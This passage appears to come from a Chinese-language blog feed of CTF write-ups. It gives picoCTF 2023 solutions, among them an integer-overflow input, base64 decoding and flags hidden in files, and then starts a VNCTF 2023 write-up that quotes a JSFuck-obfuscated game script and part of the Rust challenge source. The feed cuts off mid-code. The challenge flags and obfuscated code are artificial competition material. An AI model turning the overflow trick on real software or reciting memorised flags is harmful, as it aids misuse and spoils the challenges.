src="/2023/03/20/picoCTF2023/13.png" class=""><p>解码<code>This is the secret: picoCTF&#123;R34DING_LOKd_</code></p><p>把这一半当做压缩包密码解码得到flag<code>picoCTF&#123;R34DING_LOKd_fil56_succ3ss_cbf2ebf6&#125;</code></p><h3 id="0x0emsb"><a class="markdownIt-Anchor" href="#0x0emsb"></a> 0x0EMSB</h3><p>发现图片在各个颜色第七管道变化</p><img src="/2023/03/20/picoCTF2023/14.png" class=""><p>直接全部复制下来，然后查找pico</p><img src="/2023/03/20/picoCTF2023/15.png" class=""><h3 id="0x0fchrono"><a class="markdownIt-Anchor" href="#0x0fchrono"></a> 0x0Fchrono</h3><img src="/2023/03/20/picoCTF2023/16.png" class=""><h3 id="0x10money-ware"><a class="markdownIt-Anchor" href="#0x10money-ware"></a> 0x10money-ware</h3><p>提示借助google</p><img src="/2023/03/20/picoCTF2023/17.png" class=""><img src="/2023/03/20/picoCTF2023/18.png" class=""><h3 id="0x11permissions"><a class="markdownIt-Anchor" href="#0x11permissions"></a> 0x11Permissions</h3><p>步骤同chrono</p><h3 id="0x12repetitions"><a class="markdownIt-Anchor" href="#0x12repetitions"></a> 0x12repetitions</h3><p>连续的base64编码</p><p>连续解码后得到<code>picoCTF&#123;base64_n3st3d_dic0d!n8_d0wnl04d3d_4557ec3e&#125;</code></p><h3 id="0x13rules-2023"><a class="markdownIt-Anchor" href="#0x13rules-2023"></a> 0x13Rules 2023</h3><p>直接页面源码搜<code>picoCTF&#123;</code></p><img src="/2023/03/20/picoCTF2023/19.png" class=""><h3 id="0x14two-sum"><a class="markdownIt-Anchor" href="#0x14two-sum"></a> 0x14two-sum</h3><p>下载C语言源码，输入两个数，满足<code>n1 &gt; n1 + n2 OR n2 &gt; n1 + n2</code></p><p>属于整数溢出</p><p>c语言int类型溢出是大于<code>2147483647</code></p><p>所以输入 <code>2147483647</code>和<code>1</code></p><img src="/2023/03/20/picoCTF2023/20.png" class=""><h3 id="0x15ready-gladiator-0"><a class="markdownIt-Anchor" href="#0x15ready-gladiator-0"></a> 0x15Ready Gladiator 0</h3><p>直接输个<code>end</code>就出flag,没看源码，不知道什么原理<code>picoCTF&#123;h3r0_t0_z3r0_4m1r1gh7_a7bf8a57&#125;</code></p><h3 id="0x16useless"><a class="markdownIt-Anchor" href="#0x16useless"></a> 0x16useless</h3><p>居然是把flag藏在帮助文档里面</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">man useless</span><br></code></pre></td></tr></table></figure><img src="/2023/03/20/picoCTF2023/21.png" class=""><h3 id="0x17timer"><a class="markdownIt-Anchor" href="#0x17timer"></a> 0x17timer</h3><p>用jadx打开在<code>com/example.timer/BuildConfig</code>可以找到flag<code>picoCTF&#123;t1m3r_r3v3rs3d_succ355fully_17496&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2023</title>
    <link href="/2023/02/19/VNCTF2023/"/>
    <url>/2023/02/19/VNCTF2023/</url>
    
    <content type="html"><![CDATA[<h3 id="象棋王子"><a class="markdownIt-Anchor" href="#象棋王子"></a> 象棋王子</h3><p>前端JS游戏，按照之前发过的一篇<a href="https://fru1ts.github.io/2023/01/14/%E5%89%8D%E7%AB%AFjs/">前端JS</a>的思路，直接看js文件</p><p>可以发现<code>play.js</code>有结束的判断</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">play.<span class="hljs-property">showWin</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">my</span>)&#123;<br>play.<span class="hljs-property">isPlay</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (my===<span class="hljs-number">1</span>)&#123;<br>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+[![]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;很遗憾，你输了！&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这些符号是被编码过的，直接复制到控制台解码得到flag<code>flag&#123;w3lc0m3_t0_VNCTF_2023~~~&#125;</code></p><h3 id="电子木鱼"><a class="markdownIt-Anchor" href="#电子木鱼"></a> 电子木鱼</h3><p>先下源码，是一个rust 语言编写的</p><p>看到 <code>main.rs</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> actix_files::Files;<br><span class="hljs-keyword">use</span> actix_web::&#123;<br>    error, get, post,<br>    web::&#123;<span class="hljs-keyword">self</span>, Json&#125;,<br>    App, Error, HttpResponse, HttpServer,<br>&#125;;<br><span class="hljs-keyword">use</span> once_cell::sync::Lazy;<br><span class="hljs-keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;<br><span class="hljs-keyword">use</span> std::sync::&#123;Arc, Mutex&#125;;<br><span class="hljs-keyword">use</span> tera::&#123;Context, Tera&#125;;<br><br><span class="hljs-keyword">static</span> GONGDE: Lazy&lt;ThreadLocker&lt;<span class="hljs-type">i32</span>&gt;&gt; = Lazy::<span class="hljs-title function_ invoke__">new</span>(|| ThreadLocker::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-number">0</span>));<br><br><span class="hljs-meta">#[derive(Debug, Clone, Default)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ThreadLocker</span>&lt;T&gt; &#123;<br>    value: Arc&lt;Mutex&lt;T&gt;&gt;,<br>&#125;<br><br><span class="hljs-keyword">impl</span>&lt;T: <span class="hljs-built_in">Clone</span>&gt; ThreadLocker&lt;T&gt; &#123;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> T &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">mutex</span> = <span class="hljs-keyword">self</span>.value.<span class="hljs-title function_ invoke__">lock</span>().<span class="hljs-title function_ invoke__">unwrap</span>();<br>        mutex.<span class="hljs-title function_ invoke__">clone</span>()<br>    &#125;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">set</span>(&amp;<span class="hljs-keyword">self</span>, val: T) &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">mutex</span> = <span class="hljs-keyword">self</span>.value.<span class="hljs-title function_ invoke__">lock</span>().<span class="hljs-title function_ invoke__">unwrap</span>();<br>        *mutex = val;<br>    &#125;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">from</span>(val: T) <span class="hljs-punctuation">-&gt;</span> ThreadLocker&lt;T&gt; &#123;<br>        ThreadLocker::&lt;T&gt; &#123;<br>            value: Arc::<span class="hljs-title function_ invoke__">new</span>(Mutex::<span class="hljs-title function_ invoke__">new</span>(val)),<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#[derive(Serialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">APIResult</span> &#123;<br>    success: <span class="hljs-type">bool</span>,<br>    message: &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-type">str</span>,<br>&#125;<br><br><span class="hljs-meta">#[derive(Deserialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Info</span> &#123;<br>    name: <span class="hljs-type">String</span>,<br>    quantity: <span class="hljs-type">i32</span>,<br>&#125;<br><br><span class="hljs-meta">#[derive(Debug, Copy, Clone, Serialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Payload</span> &#123;<br>    name: &amp;<span 